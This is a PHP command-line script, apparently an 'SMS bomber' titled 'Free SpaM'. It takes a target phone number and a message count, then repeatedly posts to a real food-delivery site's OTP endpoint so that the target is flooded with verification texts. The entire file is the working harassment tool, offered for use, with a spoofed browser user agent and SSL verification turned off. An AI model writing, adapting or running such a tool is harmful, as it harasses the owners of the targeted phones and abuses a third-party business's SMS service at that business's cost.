<?php
error_reporting(0);
Class Bom {
	public $no;
	public function sendC($url, $page, $params) {
        $ch = curl_init(); 
        curl_setopt ($ch, CURLOPT_URL, $url.$page); 
        curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
        if(!empty($params)) {
        curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt ($ch, CURLOPT_POST, 1); 
        }
        curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
        curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
        curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
        $headers  = array();
        $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
        $headers[] = 'X-Requested-With: XMLHttpRequest';
        curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);    
        //curl_setopt ($ch, CURLOPT_HEADER, 1);
        $result = curl_exec ($ch);
        curl_close($ch);
        return $result;
    }
    private function getStr($start, $end, $string) {
        if (!empty($string)) {
        $setring = explode($start,$string);
        $setring = explode($end,$setring[1]);
        return $setring[0];
        }
    }
    public function Verif()
    {
        $url = "https://www.phd.co.id/en/users/sendOTP";
        $no = $this->no;
        $data = "phone_number={$no}";
        $send = $this->sendC($url, null, $data);
        if (preg_match('/Kami telah mengirim OTP ke ponsel Anda, Silakan masukkan kode 4 digit./', $send)) {
                print('OTP Berhasil Dikirim!<br>');
            } else {
                print('OTP Gagal Dikirim!<br>');
            }
    }
    
}
menu:
system($bersih);
$green  = "\e[92m";
$red    = "\e[91m";
$yellow = "\e[93m";
$blue   = "\e[36m";
$init = new Bom();
echo $green."
  __  ___  __  __ __    __  __ __   __  
/' _/| _,\/  \|  V  | /' _/|  V  |/' _/ 
`._`.| v_/ /\ | \_/ | `._`.| \_/ |`._`. 
|___/|_| |_||_|_| |_| |___/|_| |_||___/\n".$yellow.
"Free SpaM";
echo $blue."
[!] Author   : Mr.yM                        [!]
[!] Youtube  : www.youtube.com/MAULANARyM   [!]
[!] github   : github.com/MaulanaRyM        [!]\n";
echo "";
echo $red.
"NB: Input Nomor Hp Tanpa 62/0
[!] Contoh : 85244322xxx [!]\n";
echo $yellow.
"[!] Nomor Target\nInput : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo $green.
"[!] Jumlah Pesan\nInput : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) {
    $init->Verif($init->no);
}
